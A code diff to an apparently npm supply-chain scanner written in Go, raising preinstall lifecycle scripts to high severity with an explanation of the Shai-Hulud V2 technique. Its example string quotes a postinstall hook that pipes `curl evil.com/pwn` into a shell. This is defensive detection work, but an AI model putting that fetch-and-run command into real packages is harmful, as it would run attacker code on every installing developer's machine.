@@ -104,17 +104,32 @@ func (s *ScriptsAnalyzer) Analyze(_ context.Context, _ *registry.PackageMetadata
 			continue
 		}
 
+		// Preinstall is more dangerous - runs BEFORE installation completes (Shai-Hulud V2 technique)
+		// Even failed installations execute preinstall, maximizing attack surface
+		severity := SeverityMedium
+		exploitExample := "Lifecycle scripts run automatically during `npm install` with no user prompt.\n" +
+			"    An attacker publishes a package with a postinstall script:\n" +
+			"      \"postinstall\": \"node -e \\\"require('child_process').exec('curl evil.com/pwn|sh')\\\"\"\n" +
+			"    Every developer who installs the package executes attacker-controlled code.\n" +
+			"    Mitigate with: npm install --ignore-scripts"
+
+		if scriptName == "preinstall" {
+			severity = SeverityHigh
+			exploitExample = "PREINSTALL is the most dangerous lifecycle hook (Shai-Hulud V2 attack vector):\n" +
+				"    1. preinstall runs BEFORE the package is fully installed\n" +
+				"    2. Even if installation FAILS, preinstall has already executed\n" +
+				"    3. This means `npm install some-package && npm uninstall` still runs the payload\n" +
+				"    4. Shai-Hulud V2 exploited this to maximize infections\n" +
+				"    Mitigate with: npm install --ignore-scripts"
+		}
+
 		findings = append(findings, Finding{
-			Analyzer:    s.Name(),
-			Title:       "Lifecycle script: " + scriptName,
-			Description: "Package has a " + scriptName + " script: " + truncate(scriptBody, 100),
-			Severity:    SeverityMedium,
-			ExploitExample: "Lifecycle scripts run automatically during `npm install` with no user prompt.\n" +
-				"    An attacker publishes a package with a postinstall script:\n" +
-				"      \"postinstall\": \"node -e \\\"require('child_process').exec('curl evil.com/pwn|sh')\\\"\"\n" +
-				"    Every developer who installs the package executes attacker-controlled code.\n" +
-				"    Mitigate with: npm install --ignore-scripts",
-			Remediation: "Inspect the script content in the tarball. If the script is unnecessary, use 'npm install --ignore-scripts'. If valid, ensure it does not download or execute arbitrary external code.",
+			Analyzer:       s.Name(),
+			Title:          "Lifecycle script: " + scriptName,
+			Description:    "Package has a " + scriptName + " script: " + truncate(scriptBody, 100),
+			Severity:       severity,
+			ExploitExample: exploitExample,
+			Remediation:    "Inspect the script content in the tarball. If the script is unnecessary, use 'npm install --ignore-scripts'. If valid, ensure it does not download or execute arbitrary external code.",
 		})
 
 		for _, sp := range suspiciousPatterns {
